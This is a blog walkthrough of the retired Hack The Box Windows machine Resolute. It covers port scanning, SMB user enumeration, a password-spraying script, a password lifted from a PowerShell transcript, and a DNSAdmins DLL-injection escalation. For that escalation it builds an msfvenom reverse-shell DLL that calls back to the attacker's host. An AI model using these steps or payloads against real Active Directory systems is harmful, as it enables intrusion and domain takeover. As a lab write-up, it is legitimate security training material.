---
layout: post
title: "Resolute: Hack The Box Walkthrough"
date: 2020-05-30 15:26:20 +0000
last_modified_at: 2020-05-30 15:26:20 +0000
category: Walkthrough
tags: ["Hack The Box", Resolute, retired, Windows, Medium]
comments: true
image:
  feature: resolute-htb-walkthrough.jpg
  credit: andychoinski / Pixabay
  creditlink: https://pixabay.com/photos/dashboard-high-resolution-3800651/
---

This post documents the complete walkthrough of Resolute, a retired vulnerable [VM][1] created by [egre55][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Resolute is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.169 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-09 11:13:14 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 61463/udp on 10.10.10.169
Discovered open port 3269/tcp on 10.10.10.169
Discovered open port 88/tcp on 10.10.10.169
Discovered open port 49677/tcp on 10.10.10.169
Discovered open port 49667/tcp on 10.10.10.169
Discovered open port 9389/tcp on 10.10.10.169
Discovered open port 636/tcp on 10.10.10.169
Discovered open port 52115/udp on 10.10.10.169
Discovered open port 445/tcp on 10.10.10.169
Discovered open port 49664/tcp on 10.10.10.169
Discovered open port 53/tcp on 10.10.10.169
Discovered open port 139/tcp on 10.10.10.169
Discovered open port 593/tcp on 10.10.10.169
Discovered open port 49676/tcp on 10.10.10.169
Discovered open port 55256/udp on 10.10.10.169
Discovered open port 54973/udp on 10.10.10.169
Discovered open port 5985/tcp on 10.10.10.169
Discovered open port 49665/tcp on 10.10.10.169
Discovered open port 464/tcp on 10.10.10.169
Discovered open port 47001/tcp on 10.10.10.169
Discovered open port 49666/tcp on 10.10.10.169
Discovered open port 3268/tcp on 10.10.10.169
Discovered open port 49688/tcp on 10.10.10.169
Discovered open port 56921/udp on 10.10.10.169
```

Whoa, it's a Windows machine alright. Just look at the number of open ports. Let's do one better with `nmap` scanning the discovered ports below 47001 to establish their services.

```
# nmap -n -v -Pn -p53,88,139,445,464,593,636,3268,3269,5985,9389 -A --reason -oN nmap.txt 10.10.10.169
...
PORT     STATE SERVICE      REASON          VERSION
53/tcp   open  domain?      syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2019-12-09 11:38:42Z)
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?    syn-ack ttl 127
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped   syn-ack ttl 127
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped   syn-ack ttl 127
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       syn-ack ttl 127 .NET Message Framing
...
Host script results:
|_clock-skew: mean: 2h47m02s, deviation: 4h37m10s, median: 7m01s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2019-12-09T03:39:14-08:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-12-09T11:39:12
|_  start_date: 2019-12-09T11:07:16
```

Let's see what we can glean from `rpcclient` with `enumdomusers`.

{% include image.html image_alt="55207cfd.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/55207cfd.png" %}

That's a lot of users. We can use some `bash`-fu to query all users using `rpcclient` as the main driver.

```
for user in $(cat users.txt); do rpcclient 10.10.10.169 -U% -c "queryuser $user" 2>/dev/null && echo; done | tee userinfo.txt
```

{% include image.html image_alt="06b4d595.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/06b4d595.png" %}

Something is amiss. Looks like the administrator has forgotten to remove the default password in the description. :wink:

With that in mind, let's write a simple script to test which user hasn't changed the password yet.

<div class="filename"><span>brute.sh</span></div>

```
#!/bin/bash

DOMAIN=megabank.local
HOST=10.10.10.169
NAME=RESOLUTE
USER=$1
PASS=$2

function die() {
  killall perl 2>/dev/null
}

if smbclient -I $HOST -L $NAME -U "$DOMAIN/$USER%$PASS" &>/dev/null; then
  echo "[*] User found: $USER"
  echo "[*] Password found: $PASS"
  die
fi
```

{% include image.html image_alt="e08b3797.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/e08b3797.png" %}

So `melanie` is the one!

## Low-Privilege Shell

Armed with `melanie`'s password, let's see if she can log in to the remote machine via WinRM. Enter [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

{% include image.html image_alt="55fc6a8a.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/55fc6a8a.png" %}

Bingo!

The file `user.txt` is at melanie's desktop.

{% include image.html image_alt="e8c879e3.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/e8c879e3.png" %}

## Privilege Escalation

During enumeration of `melanie`'s account, I notice that the presence of PowerShell transcript at `C:\PSTranscripts`.

{% include image.html image_alt="5707c9e6.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/5707c9e6.png" %}

### PowerShell transcript

What is PowerShell transcript? A PowerShell transcript is a simple text file that contains a history of all commands and their output. It's almost like `Get-History` which only displays the input commands; inputs and outputs of all sessions are recorded in the transcript.

Guess who turned it on?

{% include image.html image_alt="59ff7b27.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/59ff7b27.png" %}

And what have we here?

{% include image.html image_alt="da53ac0b.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/da53ac0b.png" %}

ryan's password `Serv3r4Admin4cc123!`.

### PowerShell Remoting

Armed with `ryan`'s password, we can PS remote into his account like so.

{% include image.html image_alt="cd209b02.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/cd209b02.png" %}

And from there spawn a basic command prompt, just to keep things in check.

{% include image.html image_alt="dc0817f1.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/dc0817f1.png" %}

### DNSAdmin to DC compromise

During enumeration of `ryan`'s account, I notice that `ryan` is in the **DNSAdmins** group.

{% include image.html image_alt="316f7eac.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/316f7eac.png" %}

According to this [article](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83), ***in addition to implementing their own DNS server, Microsoft also implemented their own management protocol for it, to allow for easy management and integration with Active Directory domains. As such, it allows us, under some circumstances, to run code as SYSTEM on domain controllers, without being a domain admin.***

Long story short, it basically involves injecting a DLL of our choice into `dns.exe`, the executable behind the DNS Service. It all stems from the fact that `dns.exe` doesn't validate the path in `ServerLevelPluginDll`. Read the article for all the gory details!

Let's get to work. We need a few things:

1. Samba hosting a file share accessible by `Everyone`
2. `msfvenom` to generate a reverse shell payload in DLL

#### File share accessible by `Everyone`

Here's the `smb.conf` I use. Take note the directory permissions has to be identical to the one in the configuration file, e.g. `777`.

<div class="filename"><span>smb.conf</span></div>

```
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = kali
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[evil]
   path = /root/Downloads/resolute/tmp
   writable = yes
   guest ok = yes
   guest only = yes
   read only = yes
   create mode = 0777
   directory mode = 0777
   force user = nobody
```

#### Reverse shell payload generated by `msfvenom`

The reverse shell payload is located at `/root/Downloads/resolute/tmp`, i.e. the file share.

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.183 LPORT=4321 -f dll -o evil.dll
```

#### I got `SYSTEM` shell yo!

I didn't notice it before but `ryan` is also in Remote Management Users group. As such, we can also use Evil-WinRM to get a shell.

{% include image.html image_alt="8da9528f.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/8da9528f.png" %}

With that, we can launch the attack with `dnscmd.exe`, which is only available in PowerShell for some reason.

{% include image.html image_alt="cc446ca6.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/cc446ca6.png" %}

Launch the attack like so.

{% include image.html image_alt="ec5f0748.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/ec5f0748.png" %}

Notice the UNC path points to my file share. We just need to restart the DNS service and a reverse shell with SYSTEM privilege appears in my `nc` listener.

{% include image.html image_alt="55d777ca.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/55d777ca.png" %}

Awesome!

#### Getting `root.txt`

Getting `root.txt` with a `SYSTEM` is a piece of cake.

{% include image.html image_alt="0014e3d8.png" image_src="/026c5de4-f79e-4b72-a7a3-30b14f9bf687/0014e3d8.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/220
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/
